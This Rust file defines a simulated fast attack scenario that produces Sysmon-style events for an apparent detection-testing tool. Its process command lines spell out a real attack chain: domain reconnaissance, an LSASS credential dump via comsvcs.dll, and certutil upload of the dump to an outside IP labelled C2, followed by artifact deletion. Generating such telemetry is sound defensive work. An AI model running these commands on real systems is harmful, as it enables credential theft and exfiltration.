//! Quick smash-and-grab attack scenario (<5 minutes)
//!
//! Simulates a fast attack: initial access → recon → credential dump → exfil

use chrono::Utc;
use std::time::Duration;

use event_core::entity::Entity;
use event_core::generators::SysmonGenerator;

use super::{AttackScenario, AttackStep};

pub struct QuickScenario;

impl AttackScenario for QuickScenario {
    fn name(&self) -> &str {
        "quick"
    }

    fn generate(&self, target: &Entity, _all_entities: &[Entity]) -> Vec<AttackStep> {
        let gen = SysmonGenerator::new();
        let mut rng = rand::rng();
        let now = Utc::now();

        vec![
            // Initial access: suspicious download
            AttackStep {
                delay: Duration::from_secs(0),
                events: vec![gen.generate(now, target, &mut rng)],
                stage: "Initial Access".into(),
                description: format!("Dropper executed on {}", target.hostname),
            },
            // Recon: whoami
            AttackStep {
                delay: Duration::from_secs(3),
                events: {
                    let ts = now + chrono::Duration::seconds(3);
                    let (_child, _parent) = target.spawn_process(
                        "whoami.exe",
                        r"C:\Windows\System32\whoami.exe",
                        "whoami /all",
                        None,
                    );
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Discovery".into(),
                description: "whoami /all".into(),
            },
            // Recon: ipconfig
            AttackStep {
                delay: Duration::from_secs(8),
                events: {
                    let ts = now + chrono::Duration::seconds(8);
                    let (_child, _parent) = target.spawn_process(
                        "ipconfig.exe",
                        r"C:\Windows\System32\ipconfig.exe",
                        "ipconfig /all",
                        None,
                    );
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Discovery".into(),
                description: "ipconfig /all".into(),
            },
            // Recon: net user
            AttackStep {
                delay: Duration::from_secs(15),
                events: {
                    let ts = now + chrono::Duration::seconds(15);
                    let (_child, _parent) = target.spawn_process(
                        "net.exe",
                        r"C:\Windows\System32\net.exe",
                        "net user /domain",
                        None,
                    );
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Discovery".into(),
                description: "net user /domain".into(),
            },
            // Recon: domain admins
            AttackStep {
                delay: Duration::from_secs(25),
                events: {
                    let ts = now + chrono::Duration::seconds(25);
                    let (_child, _parent) = target.spawn_process(
                        "net.exe",
                        r"C:\Windows\System32\net.exe",
                        r#"net group "Domain Admins" /domain"#,
                        None,
                    );
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Discovery".into(),
                description: r#"net group "Domain Admins" /domain"#.into(),
            },
            // Credential access: LSASS dump
            AttackStep {
                delay: Duration::from_secs(60),
                events: {
                    let ts = now + chrono::Duration::seconds(60);
                    let (_child, _parent) = target.spawn_process("rundll32.exe", r"C:\Windows\System32\rundll32.exe",
                        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full", None);
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Credential Access".into(),
                description: "LSASS memory dump via comsvcs.dll".into(),
            },
            // Exfil: compress and upload
            AttackStep {
                delay: Duration::from_secs(120),
                events: {
                    let ts = now + chrono::Duration::seconds(120);
                    let (_child, _parent) = target.spawn_process("powershell.exe", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                        r#"powershell.exe -c "Compress-Archive -Path C:\temp\lsass.dmp -DestinationPath C:\temp\data.zip""#, None);
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Exfiltration".into(),
                description: "Compress credential dump".into(),
            },
            // Exfil: upload via certutil
            AttackStep {
                delay: Duration::from_secs(180),
                events: {
                    let ts = now + chrono::Duration::seconds(180);
                    let (_child, _parent) = target.spawn_process("certutil.exe", r"C:\Windows\System32\certutil.exe",
                        r"certutil.exe -urlcache -split -f http://185.220.101.35/upload C:\temp\data.zip", None);
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Exfiltration".into(),
                description: "Upload via certutil to C2".into(),
            },
            // Cleanup
            AttackStep {
                delay: Duration::from_secs(240),
                events: {
                    let ts = now + chrono::Duration::seconds(240);
                    let (_child, _parent) = target.spawn_process(
                        "cmd.exe",
                        r"C:\Windows\System32\cmd.exe",
                        r"cmd.exe /c del /f /q C:\temp\lsass.dmp C:\temp\data.zip",
                        None,
                    );
                    vec![gen.generate(ts, target, &mut rng)]
                },
                stage: "Defense Evasion".into(),
                description: "Delete artifacts".into(),
            },
        ]
    }
}
